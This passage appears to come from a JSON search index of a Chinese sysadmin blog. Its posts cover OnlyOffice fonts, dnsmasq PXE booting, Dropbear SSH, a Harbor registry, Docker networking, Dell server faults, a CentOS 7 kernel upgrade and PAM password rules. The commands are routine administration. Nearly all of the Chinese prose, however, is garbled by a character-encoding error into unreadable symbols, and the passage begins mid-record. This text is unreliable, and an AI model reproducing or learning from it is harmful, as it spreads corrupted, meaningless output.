//æ³¨æ„è¿™ä¸ªï¼Œé€—å· 16 } 17 } 18} 2ã€å®‰è£…å­—ä½“\nå­—ä½“æ–‡ä»¶æ”¾è¿›ä¸€ä¸ªzipçš„å‹ç¼©åŒ…ï¼Œå…¶ä¸­ä¸€ä¸ªç›®å½•åä¸ºofficeï¼Œé‡Œé¢æ˜¯æ–‡ä»¶\nç„¶åæŠŠæ–‡ä»¶ä¼ è¿›Linuxæœºå™¨ä¸­ï¼Œè§£å‹\n1export LANG=zh_CN.UTF-8 2unzip -x office.zip 3cd office 4ls æŸ¥çœ‹ä¸€ä¸‹ï¼ŒåŠ¡å¿…åƒä¸‹é¢ä¸€æ ·ï¼Œæ˜¯ä¸­æ–‡çš„\nç„¶ååœ¨officeç›®å½•é‚£ä¸€çº§ï¼ŒæŠŠå­—ä½“æ–‡ä»¶æ‹·è´è¿›å®¹å™¨\n1docker cp office 472bf8a36f14:/usr/share/fonts/truetype/custom è¿›å…¥å®¹å™¨\n1docker exec -it 472bf8a36f14 /bin/bash 2 3# æ›´æ–°å­—ä½“ 4mkfontscale 5mkfontdir 6fc-cache -fv 7documentserver-generate-allfonts.sh 8 9#é€€å‡ºå®¹å™¨ï¼Œé‡å¯ 10docker restart 472bf8a36f14 ç„¶åonlyofficeå°±ä¼š5åˆ†é’Ÿè‡ªåŠ¨ä¿å­˜ä¸€ä¸‹ï¼Œç„¶åå¤šäº†ä¸€å †å¥½çœ‹çš„ä¸­æ–‡å­—ä½“ï¼š\n","date":"2023-01-15","img":"","permalink":"https://rendoumi.com/posts/20230115-seafile_onlyoffice/","series":null,"tags":null,"title":"Seafileé…æ­onlyofficeçš„å®‰è£…"},{"categories":null,"content":"åˆšé€šè¿‡äº†CKAçš„è€ƒè¯•ï¼Œæ‹¿åˆ°äº†è¯ä¹¦ã€‚\nè¯´è€å®è¯ï¼Œæƒ³è€ƒè¿™ä¸ªå¿…é¡»ç¿»å¢™å•Šï¼Œåœ¨è€ƒè¯•çš„æ—¶å€™æ­£å¥½æ˜¯æ–°å† çš„ç¬¬ä¸‰å¤©ï¼Œçƒ§å¾—æ­£å‰å®³ã€‚\nç„¶åè€ƒè¯•çš„è¿‡ç¨‹çœŸæ˜¯ä¸€æ³¢ä¸‰æŠ˜ï¼ŒPSI è¶³è¶³é‡æ–°è®¤è¯äº†ä¸‰æ¬¡ï¼Œæµªè´¹40åˆ†é’Ÿã€‚\næœ€åéƒ½æ„Ÿè§‰è¦å®Œè›‹äº†ï¼Œåªå‰©ä¸‹ä¸åˆ°10åˆ†é’Ÿæ£€æŸ¥ï¼Œç»“æœè¿˜ä¸é”™ï¼Œè€ƒäº†90åˆ†ã€‚\næœ‰ç¬¬ä¸€æ¬¡è€ƒçš„å¯ä»¥è”ç³»æˆ‘ï¼Œæˆ‘ç»™ä½ è¯´ä¸€äº›å¿…é¡»æ³¨æ„çš„äº‹é¡¹ã€‚\nç„¶å CKA æœ‰ä¸€ä¸ªæ¨¡æ‹Ÿè€ƒè¯•ï¼Œ36å°æ—¶æ—¶é—´ï¼Œå®é™…è€ƒè¯•çš„ç¯å¢ƒè·Ÿæ¨¡æ‹Ÿçš„å®Œå…¨ä¸ä¸€æ ·å•Šã€‚\nä½†æ˜¯æ¨¡æ‹Ÿå¦‚æœä½ èƒ½è¿‡ï¼Œé‚£è€ƒè¯•ä½ ä¸€å®šèƒ½è¿‡ï¼Œæ¨¡æ‹Ÿçš„éš¾åº¦ä¸ä½ï¼Œç›¸å½“é«˜ã€‚\nè¿™å°±æŠŠæ¨¡æ‹Ÿçš„é¢˜ç»™æ”¾å‡ºæ¥ï¼Œä¾›å¤§å®¶å‚è€ƒï¼Œéå¸¸æœ‰å‚è€ƒä»·å€¼ã€‚\nå¤§å®¶å¯ä»¥å­¦åˆ°å¾ˆå¤šä¸œè¥¿ã€‚\næ–‡ä»¶ä¸‹è½½ï¼šcka.html å•htmlæ–‡ä»¶\n","date":"2023-01-12","img":"","permalink":"https://rendoumi.com/posts/20230112-cka_exam/","series":null,"tags":null,"title":"Ckaçš„æ¨¡æ‹Ÿè¯•é¢˜"},{"categories":null,"content":"å…¶å®ä¸€ç›´ç”¨çš„ç»ˆç«¯è½¯ä»¶æ˜¯terminusï¼Œå…¨ç»ˆç«¯å¯ç”¨ï¼Œä»¥å‰ç”¨ ubuntuï¼Œéå¸¸å¥½ç”¨ã€‚\nç°åœ¨æ¢åˆ°æ–°å…¬å¸ï¼Œç”¨ Win10ï¼Œä¹Ÿè£…äº†ä¸€ä¸ªã€‚\nä¸€ç›´åˆ°æœºæˆ¿æ”¹é€ å‰ï¼Œè¿˜éƒ½è§‰å¾—è¡Œï¼Œä½†æ˜¯æœºæˆ¿æ”¹é€ éœ€è¦æ”¶å›æ ¸å¿ƒäº¤æ¢æœºã€è·¯ç”±å™¨çš„æƒé™ï¼Œå¼€ç»ˆç«¯ console å±…ç„¶è¦æ”¶è´¹ä¼šå‘˜ï¼Œæ²¡åŠæ³•ï¼Œæ‰¾è€åˆ˜æ¢å›äº†å…è´¹çš„xshell 7ã€‚\nxshellçš„é…è‰²å®åœ¨æ˜¯å—ä¸äº†ï¼Œè¿˜æ˜¯å–œæ¬¢ç»¿è‰²çš„å­—ç¬¦ç•Œé¢ã€‚\nå¤‡ä»½ä¸€ä¸ªç»¿è‰²çš„æ–¹æ¡ˆï¼š\n1[mycolor] 2text(bold)=e9e9e9 3magenta(bold)=ff00ff 4text=00ff80 5white(bold)=fdf6e3 6green=80ff00 7red(bold)=ff0000 8green(bold)=3c5a38 9black(bold)=808080 10red=ff4500 11blue=00bfff 12black=000000 13blue(bold)=1e90ff 14yellow(bold)=ffff00 15cyan(bold)=00ffff 16yellow=c0c000 17magenta=c000c0 18background=042028 19white=c0c0c0 20cyan=00c0c0 21[Names] 22count=1 23name0=mycolor ä¿å­˜æˆ mycolor.xcs æ–‡ä»¶ï¼Œç„¶åå·¥å…·\u0026ndash;\u0026gt; é…è‰²æ–¹æ¡ˆï¼Œå¯¼å…¥å³å¯ï¼š\næ•´ä½“æ•ˆæœè¿˜æ˜¯æ¯”è¾ƒå¥½çš„ã€‚\næ˜¯è‡ªå·±å–œæ¬¢çš„æ ·å­ï¼Œå½“ç„¶ï¼Œå­—ä½“ä»9ä¹Ÿå¢åŠ åˆ°äº†12ã€‚\n","date":"2023-01-12","img":"","permalink":"https://rendoumi.com/posts/20230112-xshell_colors/","series":null,"tags":null,"title":"Xshellçš„ç»¿è‰²é…è‰²æ–¹æ¡ˆ"},{"categories":null,"content":"2022å¹´ç»è¿‡åŠªåŠ›ï¼Œè€ƒäº†4å¼ è¯ä¹¦ï¼Œ2023å¹´ç»§ç»­åŠªåŠ›å¥‹æ–—\u0026hellip;\u0026hellip;\né˜¿é‡Œäº‘çš„ACPè¯ä¹¦ï¼š\nAWSçš„SAA-C03è¯ä¹¦ï¼š\nK8Sçš„CKAè¯ä¹¦ï¼š\nK8Sçš„CKSè¯ä¹¦ï¼š\n","date":"2023-01-03","img":"","permalink":"https://rendoumi.com/posts/20230103-certificates/","series":null,"tags":null,"title":"2022å¹´è·å¾—çš„è¯ä¹¦"},{"categories":null,"content":"DNSMASQåšå±€åŸŸç½‘å†…çš„pxe installlæ˜¯æœ€åˆé€‚ä¸è¿‡çš„è½¯ä»¶äº†ã€‚ä¸ç”¨å•ç‹¬æ­å»º tftpserverï¼Œç”¨è‡ªå»ºçš„å³å¯ã€‚\nè€Œä¸”æ”¯æŒç»™å„ç§å­ç½‘æ‰“æ ‡ç­¾ï¼Œè¿˜å¯ä»¥æŒ‰æ ‡ç­¾å‘é€å„ç§dhcpåŒ…çš„ç‰¹å®šä¿¡æ¯ã€‚\n1interface=eth0 2bind-dynamic 3 4pxe-prompt=\u0026#34;Rendoumi PXE System\u0026#34;, 5 5 6domain-needed 7bogus-priv 8no-resolv 9no-poll 10 11#address=/jump.dedi.jp/install/103.108.236.5 12 13#UP Stream DNS Server 14server=114.114.114.114 15server=202.106.196.115 16server=202.106.0.20 17strict-order 18 19dhcp-authoritative 20dhcp-sequential-ip 21dhcp-no-override 22 23log-facility=/var/log/dnsmasq.log 24log-dhcp 25log-queries 26 27 28enable-tftp 29tftp-root = /export/servers/tftpboot 30 31#only new add host is dynamic, delete or modify not. 32#dhcp-hostsfile=/etc/dhcp-host/hosts.conf 33dhcp-hostsdir=/etc/dhcp-host 34 35# 36#Setup different options for each of the unique subnets, since default gateways will be different 37#The format for this is: dhcp-options=\u0026lt;your_tags_here\u0026gt;,\u0026lt;option\u0026gt;,\u0026lt;option_value\u0026gt; - 38#3 is router 39#1:netmask, 15:domain-name, 3:router, 6:dns-server, 40#44:netbios-ns, 46:netbios-nodetype, 47:netbios-scope, 41#31:router-discovery, 33:static-route, 121:classless-static-route, 42#43:vendor-encap 43# 44dhcp-option=option:dns-server,172.18.30.1,172.18.30.2 45dhcp-option=option:all-subnets-local,1 46dhcp-option=option:T1,2m 47dhcp-option=option:T2,4m 48 49#dhcp-range=[tag:\u0026lt;tag\u0026gt;[,tag:\u0026lt;tag\u0026gt;],][set:\u0026lt;tag\u0026gt;,]\u0026lt;start-addr\u0026gt;[,\u0026lt;end-addr\u0026gt;|\u0026lt;mode\u0026gt;][,\u0026lt;netmask\u0026gt;[,\u0026lt;broadcast\u0026gt;]][,\u0026lt;lease time\u0026gt;] 50#vlan 1 native vlan 51#dhcp-range=set:net1,172.18.29.100,172.18.29.250,static,255.255.254.0,2m 52dhcp-range=set:net1,172.18.29.100,static,2m 53dhcp-option-force=tag:net1,option:router,172.18.29.254 54 55#vlan 199 wuli 56#dhcp-range=set:net2,172.18.31.100,static,255.255.254.0,2m 57#dhcp-range=set:net2,172.18.31.100,255.255.254.0,2m 58dhcp-range=set:net2,172.18.31.100,static,2m 59dhcp-option-force=tag:net2,option:router,172.18.31.254 60 61 62# set tag \u0026#34;ipxe\u0026#34; if request comes from iPXE (\u0026#34;iPXE\u0026#34; user class) 63dhcp-userclass=set:ipxe,iPXE 64 65# alternative way, look for option 175 66#dhcp-match=set:ipxe,175 # gPXE/iPXE sends a 175 option. 67 68# if request comes from dumb firmware, send them iPXE (via TFTP) 69#dhcp-boot=tag:!ipxe,undionly.kpxe,boothost,172.18.29.2 70dhcp-boot=tag:!ipxe,undionly.kpxe 71 72 73# if request comes from iPXE, direct it to boot from boot1.php 74#dhcp-boot=tag:ipxe,http://172.18.29.2/pxeboot/boot1.php 75#--dhcp-boot=[tag:\u0026lt;tag\u0026gt;,]\u0026lt;filename\u0026gt;,[\u0026lt;servername\u0026gt;[,\u0026lt;server address\u0026gt;|\u0026lt;tftp_servername\u0026gt;]] 76dhcp-boot=tag:ipxe,tag:net1,http://172.18.29.2/pxeboot/boot1.php,172.18.29.2 77dhcp-boot=tag:ipxe,tag:net2,http://172.18.31.2/pxeboot/boot1.php,172.18.31.2 78 79# Args add(old del) mac ip hostname 80# add ac:1f:6b:21:3e:d8 103.108.236.22 1403-s27 81#dhcp-script=/bin/echo 82#dhcp-leasefile=/var/log/dnsmasq.leases 83# !!!! tag is alphanumeric label, fuck !!!!! é™„ä¸Šundionly.kpxeï¼šundionly.kpxe ","date":"2022-12-22","img":"","permalink":"https://rendoumi.com/posts/20221222-dnsmasq_pxe/","series":null,"tags":null,"title":"DNSMASQé…ç½®PXEçš„æ–¹å¼"},{"categories":null,"content":"åˆè§„å®¡è®¡ç»å¸¸éœ€è¦ç»™å„ç§è½¯ä»¶æ‰“è¡¥ä¸ï¼Œæ¯”å¦‚opensshï¼Œå¦‚æœæ˜¯é«˜ç‰ˆæœ¬è¿˜å¥½è¯´ã€‚å¦‚æœè®©ä½ è¡¥ centos 6çš„ opensshï¼Œ\né‚£ææ€•å°±è¦å–ä¸€å£¶äº†ã€‚æ›¿ä»£æ–¹æ¡ˆå¦‚ä¸‹ï¼š\ngitï¼šhttps://github.com/mkj/dropbear ä¸‹è½½åœ°å€ï¼šhttps://matt.ucc.asn.au/dropbear/dropbear.html\nä¸€ã€ä»‹ç» dropbearä½œä¸ºä¸€æ¬¾åŸºäºsshåè®®çš„è½»é‡çº§sshdæœåŠ¡å™¨ï¼Œç›¸æ¯”OpenSSHï¼Œå…¶æ›´ç®€æ´ï¼Œæ›´å°å·§ï¼Œè¿è¡Œèµ·æ¥å†…å­˜å ç”¨æ¯”ä¹Ÿæ›´å°ã€‚åœ¨åº”ç”¨è¿›ç¨‹ä¸Šï¼ŒOpenSSHä¼šå¼€å¯ä¸¤ä¸ªsshdè¿›ç¨‹æœåŠ¡ï¼Œè€Œdropbearåªå¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œç›¸è¾ƒäºOpenSSHï¼Œå…¶å¯¹äºç¡¬ä»¶è¦æ±‚ä¹Ÿæ›´ä½ï¼Œä¹Ÿæ›´èŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚\ndropbearå®ç°å®Œæ•´çš„SSHå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‰ˆæœ¬2åè®®ï¼Œä¸æ”¯æŒSSHç‰ˆæœ¬1åè®®çš„å‘åå…¼å®¹æ€§ï¼Œä»¥èŠ‚çœç©ºé—´å’Œèµ„æºï¼Œå¹¶é¿å…åœ¨SSHç‰ˆæœ¬1çš„å›ºæœ‰çš„å®‰å…¨æ¼æ´ã€‚\ndropbearä¸»è¦æœ‰ä»¥ä¸‹ç¨‹åºï¼š\næœåŠ¡ç¨‹åºï¼šdropbearï¼ˆç±»ä¼¼äºOpensshçš„sshdï¼‰ å®¢æˆ·ç¨‹åºï¼šdbclinetï¼ˆç´¯ä¸–äºOpensshçš„sshï¼‰ å¯†é’¥ç”Ÿæˆç¨‹åºï¼šdropbearkey\näºŒã€ä¸‹è½½å®‰è£…\n1wget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2 2tar jxvf dropbear-2020.81.tar.bz2 3cd dropbear-2020.81 4 5./configure 6make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; 7make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34; install 8 9mkdir /etc/dropbear/ 10dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key 11dropbear -E -p 2222 #å¯åŠ¨sshæœåŠ¡ 12dropbear -FE -p 2222 #-FæŒ‡å®šå‰å°è¿è¡Œ 13 14å®¢æˆ·ç«¯è¿æ¥ï¼š 15ssh 192.168.89.37 -p 2222 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n1æŠ¥é”™ï¼šzlib error æˆ–è€…make PROGRAMS=\u0026#34;dropbear dbclient dropbearkey dropbearconvert scp\u0026#34;å‡ºé”™ 2 3è§£å†³æ–¹æ³•ï¼š 4wget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz 5tar zxvf zlib-1.2.10.tar.gz 6cd zlib-1.2.10 7./configure --prefix=/usr/local/zlib ++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n1#centos6ç¯å¢ƒå®‰è£…æ–¹æ³•ï¼Œæ‰¾åˆ°ä¸‰ä¸ªåŒ… 2rpm -vih libtomcrypt-1.17-25.el6.x86_64.rpm 3rpm -vih libtommath-0.42.0-5.el6.x86_64.rpm 4rpm -vih dropbear-2017.75-1.el6.x86_64.rpm 5 6chkconfig sshd off 7chkconfig dropbear on 8 9/etc/init.d/dropbear status 10 11dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key 12 13/etc/init.d/sshd stop \u0026amp;\u0026amp; /etc/init.d/dropbear start ","date":"2022-12-19","img":"","permalink":"https://rendoumi.com/posts/20221219-dropbear/","series":null,"tags":null,"title":"Dropbearé…ç½®SSHæœåŠ¡"},{"categories":null,"content":"ä¸€ï¼šæˆ‘ä»¬åœ¨å…¬å¸å†…éƒ¨å»ºç«‹äº†Dockerå†…éƒ¨é•œåƒä»“åº“ï¼š\nharboræ˜¯vmwareå‡ºçš„ä¸€ä¸ªdockeré•œåƒä»“åº“ï¼Œæœ¬è´¨æ˜¯ä¸€ç»„å®¹å™¨çš„é›†åˆä½“ï¼Œç®—æ˜¯ä¸€ä¸ªå¤šå®¹å™¨çš„pod.\næ•°æ®å·ç¼ºçœæ˜¯å®¿ä¸»æœºçš„/dataï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠiscsiuæŒ‚åœ¨/data\nä¸»æœºï¼š172.18.31.28\né¦–å…ˆå®‰è£…docker-ce\næ·»åŠ docker-ceæºï¼š\nyum install epel-release\ryum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\ryum install docker-ce -y\ryum install ntp -y\rå¯åŠ¨è‡ªåŠ¨åŒæ­¥æ—¶é—´:\ntimedatectl set-ntp yes #æ­¤å¤„å¯ç”¨yes,no,1æˆ–0\ré…ç½®æ—¶åŒº:\ntimedatectl set-timezone Asia/Shanghai\ré…ç½®Dockerå¯åŠ¨å‚æ•°ï¼š\nmkdir -p /etc/docker\rcat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\rä¹‹åè£…çš„æ‰€æœ‰Dockerçš„å®¿ä¸»æœºï¼Œå¦‚æœè¦ç”¨åˆ°è¿™ä¸ªç§æœ‰ä»“åº“çš„è¯ï¼š\ncat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; /etc/docker/daemon.json\r{\r\u0026quot;insecure-registries\u0026quot;:[\u0026quot;172.18.31.28\u0026quot;],\r\u0026quot;registry-mirrors\u0026quot;: [\u0026quot;https://docker.mirrors.ustc.edu.cn/\u0026quot;]\r}\rEOF\rå¯åŠ¨docker\nsystemctl enable docker \u0026amp;\u0026amp; systemctl start docker\râ€‹\tå®‰è£…Docker-compose\nyum install docker-compose\rpip3 install -I requests==2.9 æ¥å¼ºåˆ¶ä¿®æ­£\rä¸‹è½½harborçš„ç¦»çº¿å®‰è£…åŒ…\ncd /root\rhttps://github.com/goharbor/harbor/releases/download/v2.0.1/harbor-offline-installer-v2.0.1.tgz\rtar zxvf harbor-offline-installer-v2.0.1-rc1.tgz\rcd harbor\rç¼–è¾‘é…ç½®æ–‡ä»¶ï¼š\ncp harbor.yml.tmpl harbor.yml\rvi harbor.yml\rhostname: 172.18.31.28\rharbor_admin_password: Fuckxxxbbaasskk\réšæ‰443ï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯å†…ç½‘ç”¨ï¼Œé…ä¸ªè¯ä¹¦ä¹Ÿæ˜¯å‡çš„ï¼Œæ‰€ä»¥å…³äº†443\r#https:\r# https port for harbor, default is 443\r# port: 443\r# The path of cert and key files for nginx\r# certificate: /your/certificate/path\ræ¢æ‰DBçš„pass\rdatabase:\r# The password for the root user of Harbor DB. Change this before any production use.\rpassword: xxxxxxx\r# private_key: /your/private/key/path\rç„¶åç›´æ¥å®‰è£…ï¼š\n./install.sh\rå®‰è£…å®Œæˆäº†å°±ï¼Œçœ‹ä¸€çœ¼ï¼š\ndocker-compose ps\rç„¶åç›´æ¥ç™»å½• http://172.18.31.28 å°±å¥½\nç¼ºçœæœ‰ä¸€ä¸ªlibraryçš„å¼€æ”¾é¡¹ç›®ï¼Œæˆ‘ä»¬æ¨ä¸€ä¸ªbusyboxè¿‡å»æµ‹è¯•ä¸€ä¸‹ï¼š\né¦–å…ˆæ‹‰ä¸€ä¸ªbusyboxåˆ°æœ¬åœ°\rdocker pull busybox\ræ‰“ä¸ªtag\rdocker tag busybox:latest 172.18.31.28/library/busybox\ræ¨ä¸Šå»\rdocker push 172.18.31.28/library/busybox\rè¿™æ—¶å€™å†å»31.28çš„libraryé¡¹ç›®é‡Œçœ‹ï¼Œå°±èƒ½çœ‹åˆ°æ–°æ¨ä¸Šå»çš„busyboxé•œåƒäº†\nåœ¨å…¶ä»–çš„æœºå™¨ä¸Šï¼Œé¦–å…ˆç™»å½•ï¼Œç„¶åå°±å¯ä»¥æ‹‰é•œåƒäº†ã€‚ å†ä¸¾ä¸ªå®é™…ä¾‹å­ï¼Œæˆ‘ä»¬æŠŠmetallbç»™æ¨ä¸Šå»å¤‡ç”¨ï¼š\næ‰“tag\rdocker tag docker.io/metallb/controller:v0.9.3 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\ræ¨ä¸Šå»\rdocker push 172.18.31.28/library/docker.io/metallb/controller:v0.9.3\r","date":"2022-12-19","img":"","permalink":"https://rendoumi.com/posts/20221219-docker_harbor/","series":null,"tags":null,"title":"Dockeré•œåƒä»“åº“harborçš„æ­å»ºä¸ä½¿ç”¨"},{"categories":null,"content":"dockeré»˜è®¤ç½‘æ®µæ˜¯172.17ï¼Œå’Œå…¬å¸çš„ç½‘æ®µ172.16å’Œ172.18æœ‰æ—¶å€™ä¼šå†²çªï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æ¢dockerç½‘æ®µã€‚\næ–¹æ¡ˆï¼šä¸æ”¹dockerç½‘æ®µï¼Œåˆ›å»ºä¸å’Œå…¬å¸ç½‘æ®µå†²çªçš„dockerå­ç½‘æ®µ\n1docker network create --driver=bridge --subnet=172.19.0.0/24 monitor_net è¿è¡Œå®¹å™¨æ—¶æŒ‡å®š\n1docker run -it --name \u0026lt;å®¹å™¨å\u0026gt; ---network monitor_net \u0026lt;é•œåƒå\u0026gt; åœ¨docker-composeåŒæ ·é€šè¿‡networksæŒ‡å®šï¼Œå½¢å¼å¦‚ä¸‹ï¼š\n1version: \u0026#39;3\u0026#39; 2networks: 3 monitor: 4 #ä½¿ç”¨å·²ç»å­˜åœ¨çš„ç½‘ç»œ 5 external: 6 name: monitor_net 7 8services: 9 prometheus: 10 image: prom/prometheus 11 container_name: prometheus 12 hostname: prometheus 13 privileged: true 14 restart: always 15 volumes: 16 - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml 17 - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml 18 ports: 19 - \u0026#34;9091:9090\u0026#34; 20 networks: 21 - monitor 22 links: 23 - alertmanager 24 - node-exporter ","date":"2022-12-19","img":"","permalink":"https://rendoumi.com/posts/20221219-docker_network/","series":null,"tags":null,"title":"Dockerçš„ç¼ºçœç½‘æ®µå†²çªé—®é¢˜"},{"categories":null,"content":"DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«\nç”¨æ¥åŠ è½½isoæ–‡ä»¶ï¼Œç”¨äºå®‰è£…ç³»ç»Ÿæˆ–è€…ä¿®å¤\nè¾“å…¥172.18.31.2:/export/nfsshare/centos7-live-docker.iso\nç¼ºçœæ˜¯æ”¯æŒ4ç§æ ¼å¼çš„å…±äº«ï¼š\n1 CIFS â€” //\u0026lt;IP to connect for CIFS file system\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; 2 NFS â€” \u0026lt; IP to connect for NFS file system\u0026gt;:/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; 3 HTTP â€” http://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; 4 HTTPs â€” https://\u0026lt;URL\u0026gt;/\u0026lt;file path\u0026gt;/\u0026lt;image name\u0026gt; ç‚¹å‡»Connect å¥½çš„è¯ï¼Œå°±ä¼šè¹¦å‡ºSuccess ç„¶åå¯åŠ¨è™šæ‹Ÿæ§åˆ¶å°ï¼ŒBootèœå•é€‰ä¸­å¯åŠ¨ï¼šVirtual CD/DVD/ISO é‡å¯ï¼Œå°±å¯ä»¥è¿›å…¥centos7-live-docker.isoçš„ç³»ç»Ÿäº†\n","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-dell_idrac_remote_share/","series":null,"tags":null,"title":"DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«"},{"categories":null,"content":"vlt0204, NDCç“¦ç‰¹è¶…äº†ï¼Œåæœ‰å…«ä¹æ˜¯ç½‘å¡çƒ§äº†ï¼Œç„¶åå¯¼è‡´ä¸»æ¿ç”µå‹è¿‡è½½ã€‚\nå‰é¢æ¿æ—¥å¿—ï¼šVLT0204ï¼Œç™»å½•idracçœ‹åˆ°æ—¥å¿—ï¼š\nThe system board NDC PG voltage is outside of range.\ræ‚²å‰§äº†ï¼Œå¯èƒ½æ˜¯ä¸»æ¿çƒ§äº†\nå¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€ä¸»æ¿æ”¾ç”µ\n1ã€å…³æœº 2ã€æ‹”ç”µæºçº¿ 3ã€é•¿æŒ‰ç”µæºå¼€å…³åŠåˆ†é’Ÿä¸æ”¾æ‰‹ 4ã€åŠåˆ†é’Ÿåæ”¾æ‰‹ï¼Œæ¥å›ç”µæºçº¿å¼€æœºçœ‹çœ‹\nå¦‚æœä»¥ä¸Šæ–¹æ³•ä¸è¡Œï¼Œå°±å¿…é¡»é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼š\näºŒã€æœ€å°åŒ–è´Ÿè½½æ’é”™\n1ã€æ‹”æ‰ç”µæº2 2ã€æ‹”æ‰CPU2 3ã€æ‹”æ‰æ‰€æœ‰å†…å­˜ï¼ˆåªç•™1æ¡æˆ–2æ¡ï¼‰ 4ã€æ‹”æ‰ç½‘å¡ 5ã€å¯åŠ¨çœ‹çœ‹\nR740çš„å†…å­˜æ’æ³•ï¼š\nR730çš„å†…å­˜æ’æ³•ï¼š\n","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-dell_memory/","series":null,"tags":null,"title":"Dellæœºå™¨ä¸»æ¿VLT0204æ•…éšœå¤„ç†ä»¥åŠå†…å­˜æ’æ³•"},{"categories":null,"content":"CentOS7æ›´æ–°å†…æ ¸ å†…æ ¸ä¸‹è½½åœ°å€ï¼šhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/\nå†…æ ¸åŒ…æœ‰ä¸¤ç§ï¼Œmlä¸»æµï¼Œlté•¿æœŸæ”¯æŒã€‚\næˆ‘ä»¬å‡çº§æ ¸å¿ƒè‚¯å®šæ˜¯ä¸ºäº†ä¸»æµçš„åŠŸèƒ½ï¼Œltè¿˜å‡å®ƒåšç”šã€‚\n#å‡çº§ï¼š\n1rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm #æŸ¥çœ‹å¯ç”¨å†…æ ¸\n1awk -F\\\u0026#39; \u0026#39;$1==\u0026#34;menuentry \u0026#34; {print i++ \u0026#34; : \u0026#34; $2}\u0026#39; /etc/grub2.cfg #åˆå§‹åŒ–ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤å†…æ ¸\n1grub2-set-default 0 #é‡æ–°åˆ›å»ºå†…æ ¸é…ç½®\n1grub2-mkconfig -o /boot/grub2/grub.cfg 2reboot #åç»­æœ‰éœ€è¦å†è£…ï¼Œä¸éœ€è¦æå¼€å‘å°±åˆ«è£…ï¼\n1#æ›´æ–°kernel-ml-headers 2rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm 3 4#æ›´æ–°kernel-ml-devel 5rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm ","date":"2022-12-18","img":"","permalink":"https://rendoumi.com/posts/20221218-centos7_upgrade_kernel/","series":null,"tags":null,"title":"å‡çº§CentOS7çš„kernelæ ¸å¿ƒ"},{"categories":null,"content":"å„ç§åˆè§„è¦æ±‚ä¸­éƒ½å¯¹ç”¨æˆ·ç­–ç•¥æœ‰ç€è¦æ±‚ï¼Œä»€ä¹ˆPCIå•Šï¼Œä¸Šå¸‚å®¡è®¡å•Šï¼Œéƒ½æœ‰ç€å¯†ç å¤æ‚ç¨‹åº¦çš„è¦æ±‚ï¼š\nCentOS 7 çš„ç”¨æˆ·å¯†ç ç­–ç•¥ï¼š\nä¿®æ”¹vi /etc/pam.d/system-auth\nå…¶ä¸­æœ‰ä¸€è¡Œï¼š\n1password requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= åé¢åŠ ä¸Šï¼š\n1minlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root ä¿®æ”¹æˆä¸ºï¼š\n1password requisite pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type= minlen=12 lcredit=-1 ucredit=-1 dcredit=-1 ocredit=-1 enforce_for_root æ„æ€æ˜¯ï¼š\n1å¯†ç é•¿åº¦12ï¼Œé¡»åŒ…å«ï¼šä¸€ä¸ªå°å†™å­—ç¬¦ï¼Œä¸€ä¸ªå¤§å†™å­—ç¬¦ï¼Œä¸€ä¸ªæ•°å­—ï¼Œä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œå¼ºåˆ¶rootä¹Ÿéµå®ˆæ­¤è§„åˆ™ å‚æ•°å…¨éƒ¨è§£é‡Šå¦‚ä¸‹ï¼š\n1retry=3: This option will prompt the user 3 times before exiting and returning an error. 2minlen=12: This specifies that the password cannot be less than 12 characters. 3maxrepeat=3: This allows implies that only a maximum of 3 repeated characters can be included in the password. 4ucredit=-1: The option requires at least one uppercase character in the password. 5lcredit=-1: The option requires at least one lowercase character in the password. 6dcredit=-1: This implies that the password should have at last a numeric character. 7ocredit=-1: The option requires at least one special character included in the password. 8difok=3: This implies that only a maximum of 3 character changes in the new password should be present in the old password. 9reject_username: The option rejects a password if it consists of the username either in its normal way or in reverse. 10enforce_for_root: This ensures that the password policies are adhered to even if itâ€™s the root user configuring the passwords. 